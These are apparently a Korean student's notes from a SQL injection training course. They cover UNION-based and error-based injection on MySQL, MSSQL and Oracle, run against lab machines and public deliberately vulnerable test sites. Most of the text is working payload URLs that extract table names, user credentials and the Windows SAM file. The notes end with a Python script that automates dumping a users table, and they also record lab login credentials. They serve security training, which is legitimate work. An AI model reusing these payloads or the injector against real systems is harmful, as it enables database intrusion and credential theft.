root/tomtom
aaaa1010

insert into member(name, userid, phone, email, address) value ('화이트햇', 'lozejs', '010-1234-5678', 'test@opensecurelab.com', '서울 특별시');

mysql #의 정의 : 

select concat('a', 'b', 'c', 'd') 



select * from user where user=(select user from user where host='localhost')

stacked Query는 MSSQL만 됨

8/3 2주차

select a from t1 where a=10 and b=1 order by a limit 10 

order by와 limit가 있으면 괄호가 있어야 구문이 성립된다.


블라인드 인젝션은 2006년에 데프콘에서 첨나와서 혁명이 됨

empid=1+union+select+null,null,null,null,null

empid=1+order+by+1 --
order by는 앞의 컬럼 갯수를 찾을 수 있음

mysql db는 묵시적 형변환, 자동 형변환이 됨
oracle은 하나라도 안맞으면 에러뱉음

select * from information_schema.tables

select distinct table_type from information_schema.tables

테이블 갯수 세기
count(*)
select * from Employees where employeeid=1

union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19 from information_schema.tables

where table_type='base table'
1. table 조회

2. employee 칼럼 조회

3. employee 데이터 조회
http://192.168.153.128/empinfo_id.php?empid=1 union select 1,2,FirstName,Salary,5,6,HireDate,8,9,10,11,12,13,14,15,16,17,18,19+from+Employees

'and+1=2+union+select+1,2,3,concat_ws(',',employeeid,firstname,hiredate,address),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19+from+Employees%23

조치방안
데이터 타입에 대한 제한
파라미터의 용도 int형인지 문자형인지 파악해서 조치
숫자이면 매개변수 앞에 (int) 넣어서 조치
문자 필터링 싱글쿼터, nulldata, 개행 addslashes()

http프로토콜에서 브라우저에 #은 북마크 -> %23으로 치환해야됨
싱글쿼터 앞에 %BF - apache, php, mysql 환경에서 멀티바이트 인코딩이 발생했을때
우회방법임

------------------3주차 Oracle DB----------------

/usr/share/tomcat/webapps/ROOT/
dbcon.jsp, empinfo_date.jsp 다운로드

systemctl start oracle-xe //오라클 스타트

*QueryDB 데이터베이스 붙는 방법
SID : xe
hr / hr 


iOS 모바일앱 취약점 진단

진단항목
탈옥방법
바이너리 코드패치
주요 필수 트윅


121.138.32.1:5000


test사이트
http://testphp.vulnweb.com

http://testasp.vulnweb.com

http://demo.testfire.net

http://php.testsparker.com

실습 순서

1. UNION 기반 SQLi 적합한 페이지 확인 -> 페이지 자체가 많지 않음
2. 인용구를 주입해서 SQLi에 취약한지 확인
3. 현재까지 학습한 방법으로는 취약한 포인트 식별 불가
4. 첫 화면의 검색 기능 GO의 파라미터 타입을 예측해서 전체 게시물 나열
5. 쿼리 주입이 가능하도록 공격구문 구성
6. 칼럼의 개수 확인
7. 테이블명 확인이 불가함
8. 필터링이 되어 있으며, 필터링된 키워드를 식별
9. 칼럼명 확인
10. 데이터 조회


1. http://testphp.vulnweb.com

http://testphp.vulnweb.com/listproducts.php?cat=1+union+select+1,version(),3,4,5,6,column_name,8,9,10,11+from+information_schema.columns+where+table_name=%27users%27
Mean 

Trees

uname 

pass

cc

address

email

name 

phone 

cart

http://testphp.vulnweb.com/listproducts.php?cat=1+and+1=2+union+select+1,2,3,4,5,6,concat_ws(',',uname,pass),8,9,10,11+from+users%23

2. http://testasp.vulnweb.com

http://testasp.vulnweb.com/showforum.asp?id=0'
http://testasp.vulnweb.com/showforum.asp?id=0--

http://testasp.vulnweb.com/showforum.asp?id=0+order+by+4--

http://testasp.vulnweb.com/showforum.asp?id=0+union+select+null,null--

http://testasp.vulnweb.com/Templatize.asp?item=showforum.asp 

http://testasp.vulnweb.com/Templatize.asp?item=search.asp 

http://testasp.vulnweb.com/Search.asp?tfSearch=')>0)--

http://testasp.vulnweb.com/Search.asp?tfSearch=')>0)+union+select+1,2,3,4,5,6,7,8,9,10--

http://testasp.vulnweb.com/Search.asp?tfSearch=')>0)+union+select+1,2,table_name,4,5,6,7,8,9,10+from+information_schema.tables--

http://testasp.vulnweb.com/Search.asp?tfSearch=')>0)+union+select+1,2,column_name,4,5,6,7,8,9,10+from+information_schema.columns+where+table_name='users'--

http://testasp.vulnweb.com/Search.asp?tfSearch=')>0)+union+select+1,2,concat(uname,',',upass),4,5,6,7,8,9,10+from+users--

풀이 : ' 넣으면 500에러페이지로 SQL 쿼리 에러를 막아놓은것
'))>0+order+by+11
파라미터가 두개가 될수도있음


3. http://php.testsparker.com

http://php.testsparker.com?id=test' or ''='
http://php.testsparker.com?id=123+or+1=1
http://php.testsparker.com?id=123+or+1=1%23
http://php.testsparker.com?id=123+or+1=1)%23
http://php.testsparker.com?id=123+or+1=1))%23
http://php.testsparker.com?id=1+and+1=1))+union+select+1,2,3,4,5%23

화면과 같이 information_schema.tables에서 table_schema, table_name 이 나열되게 union 구문을 구성해 보세요.

http://php.testsparker.com/artist.php?id=9))+union+select+1,table_schema,3,4,5+from+information_schema.tables--+

http://php.testsparker.com/artist.php?id=9))+union+select+1,table_name,3,4,5+from+information_schema.tables--+

http://php.testsparker.com/artist.php?id=123+and+1=2))+union+select+1,2,table_name,4,5+from+information_schema.tables+where+table_type=%27base+table%27%23

필터링됬는지 알려면 /*table_name*/ 이렇게해서 통과되는지 확인하면됨

싱글쿼터(')는 문자열 : ' 문자열 '
더블쿼터(") : "객체명"

http://php.testsparker.com/artist.php?id=123+and+1=2))+union+select+1,column_name,table_name,4,5+from+information_schema.columns+where+table_name="actor"%23

http://php.testsparker.com/artist.php?id=123+and+1=2))+union+select+1,column_name,table_name,4,5+from+information_schema.columns+where+table_name=0x6163746f72%23 //actor hex변환한 값

현재 database 조회
http://php.testsparker.com/artist.php?id=123+and+1=2))+union+select+1,2,host,user,password+from+mysql.user%23


소스코드 다운로드 
http://php.testsparker.com/artist.php?id=123+and+1=2))+union+select+1,2,load_file(),4,5%23
C:\AppServ\www\hello.php 문자를 URL인코딩해서 load_file()안에 삽입

/Windows/system32/drivers/etc\hosts
C:\WINDOWS\system32\config\SAM
C:\WINDOWS\repair\sam

*********Union 기반 SQL 인젝션 ***************
1. 숫자형 데이터 
empinfo_id.php?empid=1
empinfo_id.php?empid=1'

1) 열(column)의 개수 확인
ORDER BY절의 구조
ORDER BY {col_name | expr | position} [ASC | DESC],...]

empinfo_id.php?empid=1+order+by+19
empinfo_id.php?empid=1+order+by+20 //에러발생 시 19개 컬럼임

2) 집합 열과 호환되는 데이터 타입 확인 
empinfo_id.php?empid=1+UNION+SELECT+null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null+FROM+dual%23

empinfo_id.php?empid=1+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19+FROM+dual

테이블명 조회
empinfo_id.php?empid=1+UNION+SELECT+1,2,3,table_name,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19+FROM+information_schema.tables

테이블 목록 조회
empinfo_id.php?empid=0+UNION+SELECT+1,2,3,table_name,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19+FROM+information_schema.tables+where+table_type='base_table'

컬럼명 조회
empinfo_id.php?empid=1+UNION+SELECT+1,2,column_name,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19+FROM+information_schema.columns+WHERE+table_name='Employees'

데이터 조회 
empinfo_id.php?empid=null+UNION+SELECT+EmployeeID,2,Firstname,Salary,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19+FROM+Employees

2. 문자형 데이터 
' or ''='
' or 1=1--
' or 1=1#
' and ''='
' and 1=1--
' and 1=1#

3. 날짜형 데이터 

4. 스키마 객체 
test.jsp?cname=employee_id&empid=100
test.jsp?cname=employee_id'&empid=100

test.jsp?cname=1=1+and+employee_id&empid=100
test.jsp?cname=1=2+and+employee_id&empid=100

test.jsp?cname=1=2+union+select+1,table_name,'three','four','five',null,'seven',8,9,10,11+from+tabs--employee_id&empid=100

test.jsp?cname=employees--&empid=100
test.jsp?cname=employees+where+1=1--&empid=100
test.jsp?cname=employees+where+1=2--&empid=100
test.jsp?cname=employees+where+1=2+union+select+1,table_name,'three','four','five',null,'seven',8,9,10,11+from+tabs--&empid=100


*********Error 기반 SQL 인젝션 ***************
[MSSQL]
systemctl start mssql-server

select top 1 table_name from information_schema.tables where table_name not in ('')

Select top 1 table_name  from(select top 3 table_name from INFORMATION_SCHEMA.tables order by 1 asc)T order by 1 desc

select row_number() over(order by table_name) as rowid, table_name from information_schema.tables

http://192.168.2.7/mssql_id.php?empid=2/@@version--

http://192.168.2.7/mssql_id.php?empid=2+and+1=@@version--

http://192.168.2.7/mssql_id.php?empid=2+and+1=(select+@@version)--

empid=(select+table_name+from+(select+row_number()+over(order+by+table_name)+as+rowid,+table_name+from+information_schema.tables+where+table_type'base+table')T+where+rowid=5

empid=(select+table_name+from+(select+row_number()+over(order+by+table_name)+as+rowid,+table_name+from+information_schema.tables+where+table_type'base+table')T+where+rowid=5


select table_name from (select row_number() over(order by table_name) as rowid, table_name from information_schema.tables where table_type='base table')T where rowid=1

(select+column_name+from(select+row_number()+over (


(select+column_name+from(select+row_number()+over(order+by+column_name)+as+rowid,+column_name+from+information_schema.columns+where+table_name='Employees')T+where+rowid=1)

데이터 가져오는 쿼리
select column_name from (select row_number() over(order by EmployeeID) as rowid, firstname,hiredate,title from Employees)T where rowid=2

FirstName, HireDate, Title

select FirstName, HireDate, Title from (select row_number() over(order by EmployeeID) as rowid, firstname,hiredate,title from Employees)T where rowid=2

(select+firstname%2b','%2bcast(hiredate+as+varchar)%2b','%2btitle+from(select+row_number()+over(order+by+EmployeeID)+as+rowid,+firstname,hiredate,title+from+Employees)T+where+rowid=9)--


문자열 결함 예시

select top 1 firstname+','+cast(hiredate as varchar)+','+title+from+Employees 

column
Address
BirthDate
City
Country
EmployeeID
Extension
FirstName
HireDate
HomePhone
LastName
Notes
Photo
PhotoPath
PostalCode
Region
ReportsTo
Title
TitleOfCourtesy


[MYSQL] 
* 더블쿼리 인젝션(MYSQL Errorbase) 

1) 에러유발
empinfo_id.php?empid=1'

2) 버전정보 추출
empinfo_id.php?empid=1+and+1=(select+count(*)+from(select+count(*),concat(version(),floor(rand(0)*2))a+from+information_schema.tables+group+by+a)b)%23

3) 테이블명 추출
empinfo_id.php?empid=1+and+1=(select+a+from(select+count(*),concat((select+table_name+from+information_schema.tables+where+table_type='base+table'+limit+1+OFFSET+0),floor(rand(0)*2))a+from+information_schema.tables+group+by+a)b)

4) 테이블의 컬럼 획득 //Employees 테이블의 칼럼 획득시도
empinfo_id.php?empid=1+and+1=(select+a+from(select+count(*),concat((select+column_name+from+information_schema.columns+where+table_name='Employees'+limit+1+OFFSET+0),floor(rand(0)*2))a+from+information_schema.tables+group+by+a)b)
//OFFSET n 값 순차적으로 증가시키면됨

5) 칼럼의 데이터 획득 //Employees 데이터 획득 가능
empinfo_id.php?empid=1+and+1=(select+a+from(select+count(*),concat((select+concat_ws(0x2C,ifnull(EmployeeID,0x20),ifnull(FirstName,0x20),ifnull(Title,0x20),ifnull(HireDate,0x20))+from+Employees+limit+1+OFFSET+0),floor(rand(0)*2))a+from+information_schema.tables+group+by+a)b)


* XML 내장함수
 - ExtractValue Function을 이용한 기법 
 
 1)버전정보 추출
 empinfo_id.php?empid=1+and+1=(extractvalue(1,concat('.',version())))
 empinfo_id.php?empid=1+and+1=(extractvalue(1,concat('.',(select version() from dual))))
 
2) 테이블명 추출 
empinfo_id.php?empid=1+and+1=(extractvalue(1,concat(0x2e,(select+table_name+from+information_schema.tables+where+substr(table_type,1,1)=0x62+limit+1+offset+0))))
ex)
(select+count(*)+from(select+count(*),concat((select+table_name+from+information_schema.tables+where+substr(table_type,1,1)=0x62+limit+1+offset+1),
floor(rand(0)*2))a+from+information_schema.tables+group+by+a)b)

3) 칼럼명 추출
empinfo_id.php?empid=1+and+1=(extractvalue(1,concat(0x2e,(select+column_name+from+information_schema.columns+where+table_name='Employees'+limit+1+offset+0))))

4) 데이터 추출 
empinfo_id.php?empid=1+and+1=(extractvalue(1,concat(0x2e,(select+concat_ws(0x2C,ifnull(EmployeeID,0x20),ifnull(FirstName,0x20),ifnull(Title,0x20),ifnull(HireDate,0x20))+from+Employees+limit+1+OFFSET+0))))

4-1) 데이터 추출(1~32글자)
empinfo_id.php?empid=1+and+1=(extractvalue(1,concat(0x2e,(select+substr(concat_ws(0x2C,ifnull(EmployeeID,0x20),ifnull(FirstName,0x20),ifnull(Title,0x20),ifnull(HireDate,0x20)),1,32)+from+Employees+limit+1+OFFSET+0))))
//1,32 > 33,32로 바꾸면 두번째 32글자가됨



 - UpdateXML Function을 이용한 기법 
UpdateXML(xml_target, xpath_expr, new_xml) //xml데이터, Xpath표현식, 수정할 xml데이터 

SQL> select updatexml(1,concat(0x2e,version()),1) value //버전출력됨 

1) 테이블 명 추출
empinfo_id.php?empid=1+and+1=(updatexml(1,concat(0x2e,(select+table_name+from+information_schema.tables+where+substr(table_type,1,1)=0x62+limit+1+offset+0)),1)

2) 컬럼명 추출
empinfo_id.php?empid=1+and+1=(updatexml(1,concat(0x2e,(select+column_name+from+information_schema.columns+where+table_name=0x456d706c6f79656573+limit+1+offset+0)),1))

3) 테이블명
empinfo_id.php?empid=1+and+1=(updatexml(1,concat(0x2e,(select+concat_ws(0x2C,ifnull(EmployeeID,0x20),ifnull(FirstName,0x20),ifnull(Title,0x20),ifnull(HireDate,0x20))+from+Employees+limit+1+OFFSET+0)),1))




switchysharp
크롬 프록시 설정 플러그인이름입니다

cd /var/www/html
wget https://raw.githubusercontent.com/n3oism/sql/master/examples/chap6/mysql_sort.php

http://192.168.153.128/mysql_sort.php?sort=CategorySales

select count(*), concat(version(),floor(rand(0)*2))a from information_schema.tables group by a

select count(*), concat((select table_name from information_schema.tables where table_type='base table' limit 2,1),floor(rand(0)*2))a from information_schema.tables group by a

select count(*), concat(
(select column_name from information_schema.columns where table_name='Employees' limit 2,1)
,floor(rand(0)*2))a from information_schema.tables group by a

데이터 가져오기 
firstname, hiredate, salary 

mysql 더블쿼터 에러유발 구문 
select concat_ws(',',firstname,Hiredate,salary) from Employees limit 0,1

select count(*), concat(
(select concat_ws(',',firstname,Hiredate,salary) from Employees limit 0,1)
,floor(rand(0)*2))a from information_schema.tables group by a

select+a+from(select+count(*),+concat(
(select+concat_ws(0x2c,firstname,Hiredate,salary)+from+Employees+limit+0,1)
,floor(rand(0)*2))a+from+information_schema.tables+group+by+a)


(select+1+from(select+count(*),concat((select+concat_ws(0x2c,uname,pass)+from+users+limit+0,1),floor(rand(0)*2))a+from+information_schema.tables+group+by+a)T)

내장함수는 select 구문 필요없이 바로쓸 수 있음 

select extractvalue(1,concat(0x2e,@@version)) from dual;
xml데이터를 xpath구문으로 조회한다.

select+extractvalue(1,concat(0x2e,(select+table_name+from+information_schema.tables+limit+1,1))+from+dual

XML 데이터 Xpath 구문 
SET @xml = '
<items>
    <dbms>
        <value type="0">SQL Server 2005</value>
        <value type="1">MySQL 5.5</value>
        <value type="2">Oracle 11g Express</value>
    </dbms>
</items>';

SELECT ExtractValue(@xml, 'items/dbms/value') value;
SELECT ExtractValue(@xml, '/items/dbms/value') value;
SELECT ExtractValue(@xml, '/items/./dbms/value') value;
SELECT ExtractValue(@xml, '/items/dbms/../dbms/value') value;
SELECT ExtractValue(@xml, '//value[@type=1]') value;

.다음에 문자가오면 Xpath에서는 무조건 오류가 남

XML데이타, Xpath 표현식, 새로운 데이터 

SELECT ExtractValue(1, concat('.',@@version)) value;
SELECT UpdateXML(1, concat('.',@@version),1) value;

32자까지만 노출되어서 데이터가 짤릴 수도 있음 
UpdateXML(1, concat(0x2e,@@version),1)



**************8오라클 실습***********

systemctl start oracle-xe

cd /usr/share/tomcat/webapps/ROOT/
wget https://raw.githubusercontent.com/n3oism/sql/master/examples/chap6/empinfo_sort.jsp


select to_char(dbms_xmlgen.getxml('select "' || substr((select banner from v$version where rownum=1),1,30) || '" from sys.dual')) from dual

select rawtohex(XMLType((select '<start_'|| rawtohex(banner) || '_end:root>' from v$version where rownum=1))) from dual

select extractvalue(XMLTYPE('<a></a>'),
   chr(46)||(select banner from v$version where rownum=1))
 from dual

인용구 스트링쿼리 필터링이 있을 경우 
char(60)||char(97) 등으로 붙여서 해야함

select table_name from tabs

select table_name from(select rownum as rowidx, table_name from tabs)T where rowidx=1

order by 절은 칼럼명, 표현식, 위치번호가 들어감

extractvalue(XMLTYPE(%27%3Ca%3E%3C/a%3E%27),chr(46)%7c%7c(select+table_name+from(select+rownum+as+rowidx,+table_name+from+tabs)T+where+rowidx=2))

컬럼명 가져오는 쿼리 
select column_name from(select rownum as rowidx, column_name from cols where table_name='EMPLOYEES')T where rowidx=1

오라클 데이터 가져오는 쿼리 
select FIRST_NAME||','||PHONE_NUMBER||','||EMAIL from(select rownum as rowidx, FIRST_NAME,PHONE_NUMBER,EMAIL from EMPLOYEES)T where rowidx=1

실습 
오라클 예제에 테이블명, 칼럼명, 데이터 획득을 실습해 보시기 바랍니다.

extractvalue(XMLTYPE(%27%3Ca%3E%3C/a%3E%27),chr(46)%7c%7c(select column_name from(select rownum as rowidx, column_name from cols where table_name='EMPLOYEES')T where rowidx=1))

.EMPLOYEE_ID 
.FIRST_NAME 
.LAST_NAME
.EMAIL 
.PHONE_NUMBER 
.HIRE_DATE 
.JOB_ID 
.SALARY
.COMMISSION_PCT 
.MANAGER_ID 
.DEPARTMENT_ID 

오라클에서 
|| -> http 프로토콜에서 안되므로 %7c로 해야댐
+ -> %2b

다음시간 9/7
prepare_statment 작못적용했을 시 인젝션 방법 

접속방법
192.168.153.128:8080/empinfo_tab_prepared.jsp?tname=EMPLOYEES&empid=100

http://192.168.2.17:8080/empinfo_tab_prepared.jsp?tname=EMPLOYEES+WHERE+100=?--&empid=100

부적합한 열 인덱스는 ? 플레이스 홀더에 값을 할당하지 못해서 발생하였습니다.
플레이스 홀더 하드코딩 되어 있지만 사용자가 주입한 ?도 플레이스 홀더러 인식해 주기 때문에 다음과 같이 처리하면 sql 구문에 오류없이 만들수가 있습니다.
:8080/empinfo_tab_prepared.jsp?tname=EMPLOYEES+WHERE+100=?--&empid=100

이어서 UNION기반 SQLi을 해보시기 바랍니다. 시간 관계상 TABLE_NAME만 나열되게 해보세요.
:8080/empinfo_tab_prepared.jsp?tname=EMPLOYEES+WHERE+101=?+UNION+SELECT+NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL+FROM+DUAL--&empid=100

*****파이썬 문법 *****
DUAL = TAB 
money = True
if money:
    print("Take a taxi.")

else:
    print("Go on foot.")


****파이썬 SQL Injector****
sqlinjector.py

#-*- coding: utf-8 -*-
import httplib
import urllib

headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36", "Content-type": "application/x-www-form-urlencoded", "Accept": "text/html", "Connection": "keep-alive"}

delims = "!~!~!"
domain = "192.168.153.128" #가상 머신의 IP주소
url = "/empinfo_id.php" #취약한 URL 주소 
params = "empid=(select+x+from(select+count(*),concat(version(),floor(rand(0)*2))x+from+information_schema.tables+group+by+x)T)%23"

conn = httplib.HTTPConnection(domain, "80")
#conn = httplib.HTTPSConnection(domain, "443")
conn.request("GET", url + "?" + params, None, headers)
#conn.request("POST", url, params, headers)
response = conn.getresponse().read()
print response 

------delims 추가-------
delims = "!~!~!"
domain = "192.168.2.17" #가상 머신의 IP주소
url = "/empinfo_id.php" #취약한 URL 주소
params = "empid=(select+x+from(select+count(*),concat('" + delims + "',version(),'" + delims +"',floor(rand(0)*2))x+from+information_schema.tables+group+by+x)T)%23"

print cnt 
sys.exit()

싱글쿼터는 문자열 데이터만 됨

'or''='

substr 추가해서 길이 초과로 구분자가 유실되는 문제를 방지한 인젝터 코드입니다.

#-*- coding: utf-8 -*-
import httplib
import urllib
import sys

def httpreq(query):
   headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36", "Content-type": "application/x-www-form-urlencoded", "Accept": "text/html", "Connection": "keep-alive"}

   delims = "!~!~!"
   domain = "testphp.vulnweb.com" #가상 머신의 IP주소
   url = "/listproducts.php" #취약한 URL 주소
   params = "cat=(select+x+from(select+count(*),concat('" + delims + "'," + query + ",'" + delims +"',floor(rand(0)*2))x+from+information_schema.tables+group+by+x)T)%23"

   conn = httplib.HTTPConnection(domain,"80")
   #conn = httplib.HTTPSConnection(domain,"443")
   conn.request("GET",url + "?" + params,None,headers)
   #conn.request("POST",url,params,headers)
   response = conn.getresponse().read()
   return response.split(delims)[1]

table_name = "users"
column_name = "uname,pass,name,email"
#rcount = "(select+count(*)+from+information_schema.tables+where+table_type='base+table')"
#rcount = "(select+count(*)+from+information_schema.columns+where+table_name='" +table_name + "')"
rcount = "(select+count(*)+from+" +table_name + ")"

cnt = int(httpreq(rcount))
print "count : " + str(cnt)

for i in range(0,cnt):
   #query = "(select+table_name+from+information_schema.tables+where+table_type='base+table'+limit+" + str(i) + ",1)"
   #query = "(select+column_name+from+information_schema.columns+where+table_name='" + table_name + "'+limit+" + str(i) + ",1)"
   query = "(select+substr(concat_ws(','," + column_name + "),1,53)+from+" + table_name + "+limit+" + str(i) + ",1)"
   print "{0:>3}".format(str(i + 1)) + " : " + httpreq(query)

































































